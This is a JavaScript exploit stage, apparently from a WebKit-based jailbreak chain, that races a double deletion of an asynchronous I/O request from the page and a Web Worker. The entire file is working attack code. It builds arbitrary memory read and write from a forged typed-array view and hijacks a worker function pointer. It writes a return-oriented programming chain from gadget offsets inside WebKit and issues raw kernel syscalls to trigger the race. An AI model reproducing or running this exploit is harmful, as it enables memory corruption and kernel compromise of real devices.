// A completed owned AIO read is deleted from two browser threads after a
// user-event wake. Separate per-ID outputs distinguish acceptance and denial.
return new Promise(function (resolve) {
var state = window.__fw14ArrayState;
var plan = window.__fw14WorkerPlan;
var mainPlan = window.__fw14NativePlan;
var native = window.__fw14NativeInvoke;
var worker = null;
var workerUrl = null;
var timer = null;
var settled = false;
var phase = "preflight";
var restoreWorker = null;
var heldMarker = null;
var workerOutput = null, workerTimeout = null, workerChange = null;
var outputBacking = null, timeoutBacking = null, changeBacking = null;
var outputAddress = 0, timeoutAddress = 0, changeAddress = 0;
var queueFd = -1, readFd = -1, writerFd = -1, dupFd = -1;
var queueRegistered = false, socketRegistered = false;
var pageRegions = [[0x400,32],[0x700,8],[0x800,32],
[0x900,64],[0xa00,16],[0xb00,1],[0x1800,0x300]];
var pageOriginal = null;
var triggerResult = null;
var pageDeleteResult = null;
var pageDeleteWord = 0xa5a5a5a5;
var aioId = 0, aioSubmitted = false, aioDeleted = false;
var aioCleanup = "not_needed";
var deleteTarget = 0;
var triggerAt = 0;
function pageEvent(flags, fflags) {
mainPlan.frame.fill(0,0x400,0x420);
var view = new DataView(mainPlan.frame.buffer);
view.setUint32(0x400,1,true);
view.setInt16(0x408,-11,true);
view.setUint16(0x40a,flags,true);
view.setUint32(0x40c,fflags,true);
view.setUint32(0x418,0x42424242,true);
}
function socketEvent(flags) {
mainPlan.frame.fill(0,0x800,0x820);
var view = new DataView(mainPlan.frame.buffer);
view.setUint32(0x800,readFd,true);
view.setInt16(0x808,-1,true);
view.setUint16(0x80a,flags,true);
view.setUint32(0x818,0x51515151,true);
}
function closeOwned(fd) {
if (fd < 3 || fd >= 1024) return false;
try {
var closed = native.call("close",[fd]);
return closed.value === 0 && closed.high === 0;
} catch (error) { return false; }
}
function finish(status, details) {
if (settled) return;
settled = true;
if (timer !== null) clearTimeout(timer);
if (restoreWorker) {
try {
details.worker_restored = restoreWorker();
if (!details.worker_restored) status = "fail";
} catch (error) {
details.restore_error = String(error).slice(0, 180);
status = "error";
}
}
if (worker) worker.terminate();
if (workerUrl) URL.revokeObjectURL(workerUrl);
var cleanupOk = true;
if (aioSubmitted && !aioDeleted) {
try {
var rescue = native.call("sys662",[native.frameAddress+0x1940,
1,native.frameAddress+0x1984,0,0,0]);
var rescueWord = new DataView(mainPlan.frame.buffer)
.getUint32(0x1984,true);
aioCleanup = rescue.value + "/" + rescueWord;
aioDeleted = rescue.value === 0 &&
(rescueWord === 0 || rescueWord === 0x80020003);
} catch (error) {
aioCleanup = String(error).slice(0,100);
}
if (!aioDeleted) cleanupOk = false;
}
if (queueFd >= 3 && queueFd < 1024) {
if (socketRegistered && readFd >= 3) {
try {
socketEvent(2);
var socketDeleted = native.call("kevent",[queueFd,
native.frameAddress+0x800,1,0,0,0]);
cleanupOk = socketDeleted.value === 0 &&
socketDeleted.high === 0;
} catch (error) { cleanupOk = false; }
}
if (queueRegistered) {
try {
pageEvent(2,0);
var deleted = native.call("kevent",[queueFd,
native.frameAddress+0x400,1,0,0,0]);
cleanupOk = cleanupOk && deleted.value === 0 &&
deleted.high === 0;
} catch (error) { cleanupOk = false; }
}
}
if (aioDeleted || !aioSubmitted) {
if (dupFd >= 3) cleanupOk = closeOwned(dupFd) && cleanupOk;
if (writerFd >= 3) cleanupOk = closeOwned(writerFd) && cleanupOk;
if (readFd >= 3) cleanupOk = closeOwned(readFd) && cleanupOk;
}
if (queueFd >= 3) cleanupOk = closeOwned(queueFd) && cleanupOk;
if (!cleanupOk)
window.__fw14AioDualCleanup = {queue:queueFd,read:readFd,
writer:writerFd,duplicate:dupFd,id:aioId,
frame:mainPlan.frame,frameAddress:native.frameAddress};
if (pageOriginal && (aioDeleted || !aioSubmitted)) {
for (var ri=0;ri<pageRegions.length;ri++) {
var region=pageRegions[ri];
for (var bi=0;bi<region[1];bi++)
mainPlan.frame[region[0]+bi]=pageOriginal[ri][bi];
for (var ci=0;ci<region[1];ci++)
if (mainPlan.frame[region[0]+ci]!==pageOriginal[ri][ci])
cleanupOk=false;
}
}
details.cleanup_ok=cleanupOk;
details.aio_cleanup=aioCleanup;
if (!cleanupOk) status="fail";
if (cleanupOk && api && typeof api.markSync === "function")
api.markSync("aio_dual_delete_restored");
heldMarker = null;
resolve([{ id: "aio_dual_delete_v1",
status: status, details: details }]);
}
try {
if (!state || !plan || !mainPlan || !native ||
typeof native.call !== "function" ||
native.frame !== mainPlan.frame ||
!native.wrappers || !native.wrappers.socketpair ||
!native.wrappers.dup || !native.wrappers.write ||
!native.wrappers.sys669 || !native.wrappers.sys664 ||
!native.wrappers.sys662 ||
!state.view || !state.array || !state.a ||
!state.ownedTypedView || !state.calibratedViewBase ||
state.array[0] !== state.a || !mainPlan.functionSlot ||
!mainPlan.originalFunctionSlot || !plan.frame || !plan.stack ||
!plan.addresses || !plan.addresses.store || !plan.addresses.frame ||
!plan.target || !plan.webkitBase)
throw new Error("held_view_missing");
var forged = state.view;
var a = state.ownedTypedView;
var base = state.calibratedViewBase;
if (a.length !== 65536 || a[0] !== 0x31 || a[7] !== 0xa8 ||
!Number.isSafeInteger(base) || base % 4096 !== 0)
throw new Error("held_view_canary_or_base_changed");
function bytesAt(index) {
var out = [];
for (var i = 0; i < 8; i++) out.push(forged[index + i]);
return out;
}
function integerOf(bytes) {
var out = 0;
for (var i = 7; i >= 0; i--) out = out * 256 + bytes[i];
return out;
}
function pointerBytes(value) {
var out = [];
for (var i = 0; i < 8; i++)
out.push(Math.floor(value / Math.pow(2, i * 8)) & 255);
return out;
}
function addressOf(value) {
try {
state.array[0] = value;
return integerOf(bytesAt(state.index));
} finally {
state.array[0] = state.a;
}
}
var aIndex = addressOf(a) - base;
var slot = aIndex + 8;
if (!Number.isSafeInteger(slot) || slot < 0 || slot + 8 >= 16777216)
throw new Error("owned_pointer_slot_outside_view");
var original = bytesAt(slot);
function readAt(address, length) {
length = length || 24;
if (length < 1 || length > 192)
throw new Error("read_length_invalid");
if (!Number.isSafeInteger(address) || address < 0x100000000 ||
address >= 0x1000000000000)
throw new Error("candidate_address_invalid");
var next = pointerBytes(address);
try {
for (var i = 0; i < 8; i++) forged[slot + i] = next[i];
var out = [];
for (var j = 0; j < length; j++) out.push(a[j]);
return out;
} finally {
for (var k = 0; k < 8; k++) forged[slot + k] = original[k];
}
}
function writeAt(address, bytes) {
if (!Number.isSafeInteger(address) || address < 0x100000000 ||
address >= 0x1000000000000 || address % 8 !== 0 ||
!bytes || bytes.length !== 8)
throw new Error("write_target_invalid");
var next = pointerBytes(address);
try {
for (var i = 0; i < 8; i++) forged[slot + i] = next[i];
for (var j = 0; j < 8; j++) a[j] = bytes[j];
} finally {
for (var k = 0; k < 8; k++) forged[slot + k] = original[k];
}
}
function same(left, right) {
if (left.length !== right.length) return false;
for (var i = 0; i < left.length; i++)
if (left[i] !== right[i]) return false;
return true;
}
function u32(bytes, at) {
return (bytes[at] | (bytes[at + 1] << 8) |
(bytes[at + 2] << 16) | (bytes[at + 3] << 24)) >>> 0;
}
function ptr(bytes, at) {
return integerOf(bytes.slice(at, at + 8));
}
function validPointer(value) {
return Number.isSafeInteger(value) && value >= 0x100000000 &&
value < 0x1000000000000 && value % 8 === 0;
}
phase = "queue_setup";
if (!mainPlan.frame || mainPlan.frame.length < 0x1b00 ||
native.frameAddress !== mainPlan.addresses.frame ||
plan.addresses.frame === mainPlan.addresses.frame)
throw new Error("independent_frames_missing");
pageOriginal = pageRegions.map(function (region) {
return Array.from(mainPlan.frame.subarray(
region[0],region[0]+region[1]));
});
var opened = native.call("kqueue",[]);
queueFd = opened.value;
if (opened.high !== 0 || queueFd < 3 || queueFd >= 1024)
throw new Error("queue_open_invalid");
pageEvent(1,0);
var added = native.call("kevent",[queueFd,
native.frameAddress+0x400,1,0,0,0]);
if (added.value !== 0 || added.high !== 0)
throw new Error("queue_add_failed");
queueRegistered = true;
mainPlan.frame.fill(0xa5,0x700,0x708);
var pair = native.call("socketpair",[1,1,0,native.frameAddress+0x700]);
if (pair.value!==0 || pair.high!==0)
throw new Error("socketpair_failed");
var pageView = new DataView(mainPlan.frame.buffer);
readFd=pageView.getInt32(0x700,true);
writerFd=pageView.getInt32(0x704,true);
if (readFd<3 || readFd>=1024 || writerFd<3 ||
writerFd>=1024 || readFd===writerFd ||
readFd===queueFd || writerFd===queueFd)
throw new Error("socketpair_fds_invalid");
var duplicate=native.call("dup",[readFd]);
dupFd=duplicate.value;
if (duplicate.high!==0 || dupFd<3 || dupFd>=1024 ||
dupFd===readFd || dupFd===writerFd || dupFd===queueFd)
throw new Error("duplicate_fd_invalid");
phase = "aio_setup";
mainPlan.frame.fill(0,0x1800,0x1b00);
mainPlan.frame.fill(0xa5,0x1900,0x19c0);
mainPlan.frame.fill(0xa5,0x1a80,0x1b00);
function put64(at,value) {
if (!Number.isSafeInteger(value) || value < 0)
throw new Error("aio_word_invalid");
pageView.setUint32(at,value>>>0,true);
pageView.setUint32(at+4,Math.floor(value/4294967296)>>>0,true);
}
put64(0x1800,0);
put64(0x1808,1);
put64(0x1810,native.frameAddress+0x1900);
put64(0x1818,native.frameAddress+0x1920);
pageView.setInt32(0x1820,readFd,true);
var submitted = native.call("sys669",[1,native.frameAddress+0x1800,
1,3,native.frameAddress+0x1940,0]);
if (submitted.value!==0 || submitted.high!==0)
throw new Error("aio_submit_failed_"+submitted.value);
aioSubmitted = true;
aioId = pageView.getInt32(0x1940,true);
if (aioId<=0 || aioId>0x10000000)
throw new Error("aio_id_invalid");
mainPlan.frame[0x1a00]=0x51;
var unblock = native.call("write",[writerFd,
native.frameAddress+0x1a00,1]);
if (unblock.value!==1 || unblock.high!==0)
throw new Error("aio_unblock_failed");
var completed=false, aioState=0;
for (var pollIndex=0;pollIndex<256;pollIndex++) {
var polled=native.call("sys664",[native.frameAddress+0x1940,
1,native.frameAddress+0x1960,0,0,0]);
aioState=pageView.getUint32(0x1960,true);
if (polled.value!==0 || polled.high!==0)
throw new Error("aio_poll_failed_"+polled.value);
if ((aioState&0xffff)===3 || (aioState&0xffff)===4) {
completed=true; break;
}
}
if (!completed || mainPlan.frame[0x1900]!==0x51 ||
pageView.getInt32(0x1920,true)!==1)
throw new Error("aio_completion_invalid_"+aioState);
mainPlan.frame.fill(0xa5,0x1980,0x1988);
if (api && typeof api.markSync === "function")
api.markSync("aio_dual_delete_preflight");
phase = "worker_event_buffers";
workerOutput = new Uint8Array(64);
workerTimeout = new Uint8Array(16);
workerChange = new Uint8Array(32);
outputBacking = new DataView(workerOutput.buffer);
timeoutBacking = new DataView(workerTimeout.buffer);
changeBacking = new DataView(workerChange.buffer);
function dataOf(view) {
var cell = addressOf(view);
if (!validPointer(cell))
throw new Error("event_buffer_cell_invalid");
var bytes = readAt(cell,32);
var data = ptr(bytes,16);
if (!validPointer(data) || u32(bytes,24)!==view.length)
throw new Error("event_buffer_vector_invalid");
return data;
}
outputAddress = dataOf(workerOutput);
timeoutAddress = dataOf(workerTimeout);
changeAddress = dataOf(workerChange);
if (outputAddress===timeoutAddress ||
(outputAddress<timeoutAddress+16 &&
timeoutAddress<outputAddress+64) ||
(changeAddress<outputAddress+64 &&
outputAddress<changeAddress+32) ||
(changeAddress<timeoutAddress+16 &&
timeoutAddress<changeAddress+32) ||
!same(readAt(outputAddress,8),Array(8).fill(0)) ||
!same(readAt(timeoutAddress,8),Array(8).fill(0)) ||
!same(readAt(changeAddress,8),Array(8).fill(0)))
throw new Error("event_buffer_preflight_failed");
phase = "worker_create";
if (typeof Worker !== "function" || typeof Blob !== "function")
throw new Error("worker_unavailable");
var workerSource = [
"var marker = new Uint32Array(new ArrayBuffer(0x10));",
"var roots = [];",
"var leak = null, master = null, victim = null, pivot = null;",
"self.onmessage = function (event) {",
"  if (event.data && event.data.name === 'ping') {",
"    self.postMessage({ id: 0, type: 'ret', value: 'pong' });",
"    return;",
"  }",
"  if (event.data && event.data.name === 'fire') {",
"    self.postMessage({ id: 3, type: 'started', at: Date.now() });",
"    Math.expm1(pivot);",
"    self.postMessage({ id: 3, type: 'ret', value: true, at: Date.now() });",
"    return;",
"  }",
"  if (event.data && event.data.name === 'function') {",
"    master[4] = event.data.lo >>> 0;",
"    master[5] = event.data.hi >>> 0;",
"    var fnLo, fnHi;",
"    leak.value = Math.expm1;",
"    try {",
"      fnLo = victim.getUint32(16, true);",
"      fnHi = victim.getUint32(20, true);",
"      pivot = {}; roots.push(pivot);",
"      leak.value = pivot;",
"      var pivotLo = victim.getUint32(16, true);",
"      var pivotHi = victim.getUint32(20, true);",
"    } finally { leak.value = null; }",
"    master[4] = fnLo; master[5] = fnHi;",
"    var m16Lo = victim.getUint32(16, true);",
"    var m16Hi = victim.getUint32(20, true);",
"    var m24Lo = victim.getUint32(24, true);",
"    var m24Hi = victim.getUint32(28, true);",
"    var normal = Math.abs(Math.expm1(1) - 1.718281828459045) < 1e-12;",
"    self.postMessage({ id: 2, type: 'ret',",
"      value: [fnLo, fnHi, pivotLo, pivotHi,",
"              m16Lo, m16Hi, m24Lo, m24Hi, normal] });",
"    return;",
"  }",
"  leak = { value: null };",
"  master = new Uint32Array(6);",
"  victim = new DataView(new ArrayBuffer(48));",
"  marker[0] = 0x7a6b5c4d; marker[1] = 0x1234cafe;",
"  marker[2] = 0x55aa33cc; marker[3] = 0xcc33aa55;",
"  marker.leak = leak; marker.master = master; marker.victim = victim;",
"  roots = [marker, leak, master, victim];",
"  self.postMessage({ id: 1, type: 'ret', value: marker }, [marker.buffer]);",
"};"
].join("\n");
workerUrl = URL.createObjectURL(new Blob([workerSource],
{ type: "text/javascript" }));
worker = new Worker(workerUrl);
timer = setTimeout(function () {
finish("error", { phase: "worker_reply", error: "timeout" });
}, 6000);
worker.onerror = function (event) {
finish("error", { phase: "worker", error: String(event.message || "worker_error").slice(0, 180) });
};
var pingDone = false;
var waitingForRead = false;
var waitingForFire = false;
var workerSlot = 0, workerPivot = 0;
var workerSlotOriginal = null, workerPivotOriginal = null;
var frameOriginal = null;
var outputOriginal = null, timeoutOriginal = null;
var changeOriginal = null;
var slotTouched = false, pivotTouched = false, frameTouched = false;
var chainOriginal = null, pivotStackOriginal = null;
var chainTouched = false, pivotStackTouched = false;
var scratchOffset = 0x1000;
var eventTarget = 0;
var startedAt = 0;
worker.onmessage = function (event) {
if (settled) return;
try {
if (!pingDone) {
if (!event.data || event.data.id !== 0 ||
event.data.value !== "pong")
throw new Error("worker_ping_mismatch");
pingDone = true;
worker.postMessage({ id: 1, name: "init", args: [] });
return;
}
if (waitingForFire) {
if (event.data && event.data.id === 3 &&
event.data.type === "started") {
startedAt = event.data.at;
setTimeout(function () {
if (settled) return;
try {
pageEvent(0,0x01000000);
triggerAt=Date.now();
var dual=native.callMany([
{name:"kevent",args:[queueFd,
native.frameAddress+0x400,1,0,0,0]},
{name:"sys662",args:[native.frameAddress+0x1940,
1,native.frameAddress+0x1980,0,0,0]}]);
triggerResult=dual.values[0];
pageDeleteResult=dual.values[1];
pageDeleteWord=new DataView(mainPlan.frame.buffer)
.getUint32(0x1980,true);
} catch (error) {
triggerResult={value:-999,high:0,
error:String(error).slice(0,90)};
}
}, 50);
return;
}
phase = "worker_call_return";
var fired = event.data && event.data.id === 3 &&
event.data.type === "ret" && event.data.value === true;
var frameView = new DataView(plan.frame.buffer);
var waitReturn = frameView.getInt32(0, true);
var high = frameView.getUint32(4, true);
var deleteReturn = frameView.getInt32(8, true);
var deleteHigh = frameView.getUint32(12, true);
var workerDeleteWord=changeBacking.getUint32(8,true);
var returnedAt = event.data && event.data.at;
var elapsed = startedAt && returnedAt ?
returnedAt - startedAt : 0;
var triggeredDuringWait = triggerAt >= startedAt &&
triggerAt < returnedAt && startedAt > 0;
var guardIntact = true;
for (var guardIndex=32;guardIndex<64;guardIndex++)
if (workerOutput[guardIndex]!==0xa5)
guardIntact=false;
var eventMatched = outputBacking.getUint32(0,true)===1 &&
outputBacking.getUint32(4,true)===0 &&
outputBacking.getInt16(8,true)===-11;
var triggerOk = !!triggerResult &&
triggerResult.value===0 && triggerResult.high===0;
var pageAccepted=!!pageDeleteResult &&
pageDeleteResult.value===0 && pageDeleteResult.high===0 &&
pageDeleteWord===0;
var workerAccepted=deleteReturn===0 && deleteHigh===0 &&
workerDeleteWord===0;
aioDeleted=pageAccepted || workerAccepted;
var bothAccepted=pageAccepted && workerAccepted;
var oneAccepted=(pageAccepted !== workerAccepted) &&
(pageAccepted ? workerDeleteWord===0x80020003 :
pageDeleteWord===0x80020003);
var classification=bothAccepted?"two_accepted":
oneAccepted?"one_accepted":"inconclusive";
if (api && typeof api.log === "function")
api.log("AIO DELETE CHECK\npage result " +
(pageDeleteResult ? pageDeleteResult.value : "missing") +
" / 0x" + pageDeleteWord.toString(16) +
"\nworker result " + deleteReturn + " / 0x" +
workerDeleteWord.toString(16) +
"\n" + (bothAccepted ? "Both deletions accepted" :
oneAccepted ? "One deletion accepted" :
"Result needs review"));
finish(fired && waitReturn===1 && high===0 &&
elapsed<2000 && triggeredDuringWait && triggerOk &&
eventMatched && guardIntact && oneAccepted ?
"pass":"fail",
{call_returned:fired,wait_return:waitReturn,
page_return:pageDeleteResult ? pageDeleteResult.value:null,
page_per_id:pageDeleteWord,
worker_return:deleteReturn,
worker_per_id:workerDeleteWord,
classification:classification,
elapsed_ms:elapsed,
trigger_during_wait:triggeredDuringWait,
event_matched:eventMatched,guard_intact:guardIntact,
request_id:aioId});
return;
}
if (waitingForRead) {
phase = "worker_function_readback";
var reply = event.data;
var words = reply && reply.id === 2 &&
reply.type === "ret" && reply.value;
if (!Array.isArray(words) || words.length !== 9)
throw new Error("worker_function_reply_invalid");
var fn = words[0] + words[1] * 0x100000000;
var pivot = words[2] + words[3] * 0x100000000;
var m16 = words[4] + words[5] * 0x100000000;
var m24 = words[6] + words[7] * 0x100000000;
if (!validPointer(fn) || !validPointer(pivot) || !validPointer(m16) ||
!validPointer(m24))
throw new Error("worker_function_pointers_invalid");
var slot16 = m16 + 40;
var slot24 = m24 + 40;
var target16 = readAt(slot16, 8);
var target24 = readAt(slot24, 8);
var match16 = same(target16, mainPlan.originalFunctionSlot);
var match24 = same(target24, mainPlan.originalFunctionSlot);
var header = readAt(pivot, 8);
var headerOk = header.some(function (value) { return value !== 0; });
var normal = words[8] === true;
if (Number(match16) + Number(match24) !== 1 ||
!headerOk || !normal)
throw new Error("worker_call_target_preflight_failed");
phase = "native_plan_preflight";
var gadget = plan.webkitBase + 0x295f948;
var code = readAt(gadget, 9);
var expectedCode = [0x48,0x8b,0x7e,0x30,0x48,0x8b,0x07,0xff,0x10];
if (!same(code, expectedCode) ||
!same(readAt(plan.addresses.stack + plan.stackOffset, 8),
pointerBytes(plan.target)) ||
!same(readAt(plan.addresses.store, 8),
Array.from(plan.store.subarray(0, 8))) ||
Math.abs(Math.expm1(1) - 1.718281828459045) > 1e-12)
throw new Error("native_plan_changed");
eventTarget = plan.target - 0x850;
deleteTarget = native.wrappers.sys662;
var needle = [0x48,0xc7,0xc0,0x6b,1,0,0,0x49,
0x89,0xca,0x0f,0x05,0x72,0x01,0xc3,0x48];
if (!same(readAt(eventTarget, 16), needle) ||
!same(readAt(deleteTarget,16),
[0x48,0xc7,0xc0,0x96,2,0,0,0x49,
0x89,0xca,0x0f,0x05,0x72,0x01,0xc3,0x48]) ||
!same(readAt(plan.webkitBase + 0x5c480, 2), [0x5f,0xc3]) ||
!same(readAt(plan.webkitBase + 0x6e45e, 2), [0x5e,0xc3]) ||
!same(readAt(plan.webkitBase + 0x12c5ba, 2), [0x5a,0xc3]) ||
!same(readAt(plan.webkitBase + 0x1bade, 2), [0x59,0xc3]) ||
!same(readAt(plan.webkitBase + 0x9b311, 3),
[0x47,0x58,0xc3]) ||
!same(readAt(plan.webkitBase + 0x1dcfb1, 3),
[0x47,0x59,0xc3]) ||
!same(readAt(plan.webkitBase + 0x548b, 4),
[0x48,0x89,0x07,0xc3]))
throw new Error("worker_event_code_bytes_changed");
if (scratchOffset + 280 >= plan.stack.length ||
scratchOffset + 280 >= plan.stackOffset ||
plan.frame.length < 16 ||
!validPointer(outputAddress) ||
!validPointer(timeoutAddress) ||
!validPointer(changeAddress))
throw new Error("worker_event_regions_invalid");
workerSlot = match16 ? slot16 : slot24;
workerPivot = pivot;
workerSlotOriginal = readAt(workerSlot, 8);
workerPivotOriginal = header;
frameOriginal = Array.from(plan.frame.subarray(0, 16));
outputOriginal = Array.from(workerOutput);
timeoutOriginal = Array.from(workerTimeout);
changeOriginal = Array.from(workerChange);
chainOriginal = Array.from(plan.stack.subarray(
scratchOffset, scratchOffset + 280));
pivotStackOriginal = readAt(plan.addresses.pivot + 0x38, 8);
if (!same(pivotStackOriginal,
pointerBytes(plan.addresses.stack + plan.stackOffset)))
throw new Error("worker_pivot_stack_changed");
if (!same(workerSlotOriginal, mainPlan.originalFunctionSlot))
throw new Error("worker_slot_changed");
if (api && typeof api.markSync === "function")
api.markSync("aio_dual_delete_ready");
phase = "worker_call_arm";
frameTouched = true;
plan.frame.fill(0xa5, 0, 16);
workerOutput.fill(0xa5);
workerTimeout.fill(0);
timeoutBacking.setUint32(0,2,true);
workerChange.fill(0);
changeBacking.setUint32(0,aioId,true);
changeBacking.setUint32(8,0xa5a5a5a5,true);
if (!same(readAt(plan.addresses.frame, 16),
Array(16).fill(0xa5)) ||
!same(readAt(outputAddress,8),
[0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5]) ||
timeoutBacking.getUint32(0,true) !== 2 ||
!same(readAt(changeAddress,32),Array.from(workerChange)))
throw new Error("frame_sentinel_mismatch");
var chain = [plan.webkitBase + 0x5c480,
queueFd,
plan.webkitBase + 0x6e45e, 0,
plan.webkitBase + 0x12c5ba, 0,
plan.webkitBase + 0x1bade, outputAddress,
plan.webkitBase + 0x9b311, 1,
plan.webkitBase + 0x1dcfb1, timeoutAddress,
eventTarget, plan.webkitBase + 0x5c480,
plan.addresses.frame, plan.webkitBase + 0x548b,
plan.webkitBase + 0x5c480, changeAddress,
plan.webkitBase + 0x6e45e, 1,
plan.webkitBase + 0x12c5ba, changeAddress + 8,
plan.webkitBase + 0x1bade, 0,
plan.webkitBase + 0x9b311, 0,
plan.webkitBase + 0x1dcfb1, 0,
deleteTarget, plan.webkitBase + 0x5c480,
plan.addresses.frame + 8, plan.webkitBase + 0x548b,
plan.webkitBase + 0x10504, null,
plan.webkitBase + 0x182f7];
if (chain.length!==35 || chain[16]!==plan.webkitBase+0x5c480 ||
chain[28]!==deleteTarget || chain[33]!==null)
throw new Error("two_call_chain_shape_invalid");
var stackView = new DataView(plan.stack.buffer);
chainTouched = true;
for (var c = 0; c < chain.length; c++) {
if (c === 33) {
stackView.setUint32(scratchOffset + c * 8, 0x0a, true);
stackView.setUint32(scratchOffset + c * 8 + 4,
0xfffffff7, true);
} else {
stackView.setUint32(scratchOffset + c * 8,
chain[c] >>> 0, true);
stackView.setUint32(scratchOffset + c * 8 + 4,
Math.floor(chain[c] / 0x100000000) >>> 0, true);
}
}
pivotStackTouched = true;
for (var q = 0; q < 8; q++)
plan.pivot[0x38 + q] =
pointerBytes(plan.addresses.stack + scratchOffset)[q];
if (!same(readAt(plan.addresses.stack + scratchOffset, 160),
Array.from(plan.stack.subarray(
scratchOffset, scratchOffset + 160))) ||
!same(readAt(plan.addresses.stack + scratchOffset + 160, 120),
Array.from(plan.stack.subarray(
scratchOffset + 160, scratchOffset + 280))) ||
!same(readAt(plan.addresses.pivot + 0x38, 8),
pointerBytes(plan.addresses.stack + scratchOffset)))
throw new Error("worker_event_chain_readback_failed");
slotTouched = true;
writeAt(workerSlot, pointerBytes(gadget));
pivotTouched = true;
writeAt(workerPivot, pointerBytes(plan.addresses.store));
if (!same(readAt(workerSlot, 8), pointerBytes(gadget)) ||
!same(readAt(workerPivot, 8),
pointerBytes(plan.addresses.store)))
throw new Error("worker_arm_readback_failed");
waitingForRead = false;
waitingForFire = true;
phase = "worker_call";
worker.postMessage({ id: 3, name: "fire" });
return;
}
phase = "transferred_marker";
var typed = event.data && event.data.type === "ret" &&
event.data.id === 1 && event.data.value;
var markersOk = typed instanceof Uint32Array && typed.length === 4 &&
typed[0] === 0x7a6b5c4d && typed[1] === 0x1234cafe &&
typed[2] === 0x55aa33cc && typed[3] === 0xcc33aa55;
if (!markersOk) throw new Error("transferred_marker_mismatch");
heldMarker = typed;
phase = "buffer_cell";
var cell = addressOf(typed.buffer);
if (!validPointer(cell)) throw new Error("buffer_cell_invalid");
var cellBytes = readAt(cell);
var impl = ptr(cellBytes, 0x10);
if (!validPointer(impl)) throw new Error("buffer_impl_invalid");
phase = "buffer_impl";
var implBytes = readAt(impl);
var data = ptr(implBytes, 0x10);
if (!validPointer(data)) throw new Error("buffer_data_invalid");
phase = "worker_backing";
var backing = readAt(data);
var backingOk = u32(backing, 0) === 0x7a6b5c4d &&
u32(backing, 4) === 0x1234cafe &&
u32(backing, 8) === 0x55aa33cc &&
u32(backing, 12) === 0xcc33aa55;
if (!backingOk) throw new Error("worker_backing_mismatch");
phase = "storage_chain";
var storage = ptr(backing, 0x10);
if (!validPointer(storage)) throw new Error("storage_pointer_invalid");
var message = ptr(readAt(storage), 8);
if (!validPointer(message)) throw new Error("message_pointer_invalid");
var butterfly = ptr(readAt(message), 8);
if (!validPointer(butterfly) || butterfly < 0x100000018)
throw new Error("butterfly_pointer_invalid");
phase = "worker_references";
var master = 0, victim = 0, leak = 0;
var masterIndex = 0, victimIndex = 0, leakIndex = 0;
var seen = 0, shapes = [];
for (var index = 1; index <= 8; index++) {
var candidate = ptr(readAt(butterfly - index * 8, 8), 0);
if (!validPointer(candidate) ||
Math.abs(candidate - cell) >= 0x40000000) continue;
var candidateBytes = readAt(candidate, 32);
var length = u32(candidateBytes, 24);
var inline = ptr(candidateBytes, 16);
seen++;
shapes.push(index + ":" + length);
if (!master && length === 6 && validPointer(inline)) {
master = candidate; masterIndex = index;
} else if (!victim && length === 48 && validPointer(inline)) {
victim = candidate; victimIndex = index;
} else if (!leak && u32(candidateBytes, 16) === 2 &&
u32(candidateBytes, 20) === 0) {
leak = candidate; leakIndex = index;
}
}
var shapeOk = !!(master && victim && leak) &&
master !== victim && master !== leak && victim !== leak;
if (!shapeOk) throw new Error("worker_shapes_missing");
phase = "wire_worker";
var masterOriginal = readAt(master + 16, 8);
var victimOriginal = readAt(victim + 16, 8);
if (!validPointer(ptr(masterOriginal, 0)) ||
!validPointer(ptr(victimOriginal, 0)))
throw new Error("worker_vectors_invalid");
if (!same(readAt(mainPlan.functionSlot, 8),
mainPlan.originalFunctionSlot))
throw new Error("main_function_slot_changed");
var masterTouched = false;
var victimTouched = false;
restoreWorker = function () {
if (slotTouched) writeAt(workerSlot, workerSlotOriginal);
if (pivotTouched) writeAt(workerPivot, workerPivotOriginal);
if (frameTouched) {
for (var f = 0; f < 16; f++) plan.frame[f] = frameOriginal[f];
for (var o = 0; o < 64; o++)
workerOutput[o] = outputOriginal[o];
for (var t = 0; t < 16; t++)
workerTimeout[t] = timeoutOriginal[t];
for (var h = 0; h < 32; h++)
workerChange[h] = changeOriginal[h];
}
if (chainTouched)
for (var c = 0; c < 280; c++)
plan.stack[scratchOffset + c] = chainOriginal[c];
if (pivotStackTouched)
for (var p = 0; p < 8; p++)
plan.pivot[0x38 + p] = pivotStackOriginal[p];
if (victimTouched) writeAt(victim + 16, victimOriginal);
if (masterTouched) writeAt(master + 16, masterOriginal);
var changedRestored = (!slotTouched ||
same(readAt(workerSlot, 8), workerSlotOriginal)) &&
(!pivotTouched ||
same(readAt(workerPivot, 8), workerPivotOriginal)) &&
(!frameTouched ||
(same(readAt(plan.addresses.frame, 16), frameOriginal) &&
same(readAt(outputAddress, 64),
outputOriginal) &&
same(readAt(timeoutAddress, 16),
timeoutOriginal) &&
same(readAt(changeAddress, 32),
changeOriginal))) &&
(!chainTouched ||
(same(readAt(plan.addresses.stack + scratchOffset, 160),
chainOriginal.slice(0,160)) &&
same(readAt(plan.addresses.stack + scratchOffset + 160, 120),
chainOriginal.slice(160)))) &&
(!pivotStackTouched ||
same(readAt(plan.addresses.pivot + 0x38, 8),
pivotStackOriginal));
if (api && typeof api.markSync === "function")
api.markSync("aio_dual_delete_call_restored");
return changedRestored &&
same(readAt(master + 16, 8), masterOriginal) &&
same(readAt(victim + 16, 8), victimOriginal) &&
a[0] === 0x31 && a[7] === 0xa8 &&
same(bytesAt(slot), original) && state.array[0] === state.a;
};
masterTouched = true;
writeAt(master + 16, pointerBytes(victim));
if (ptr(readAt(master + 16, 8), 0) !== victim)
throw new Error("worker_master_wire_failed");
// The worker's indexed writes through master will retarget victim.
victimTouched = true;
waitingForRead = true;
phase = "worker_function";
worker.postMessage({ id: 2, name: "function", lo: leak >>> 0,
hi: Math.floor(leak / 0x100000000) >>> 0 });
} catch (error) {
finish("error", { phase: phase, error: String(error).slice(0, 180) });
}
};
worker.postMessage({ id: 0, name: "ping", args: [] });
} catch (error) {
finish("error", { phase: phase, error: String(error).slice(0, 180) });
}
});
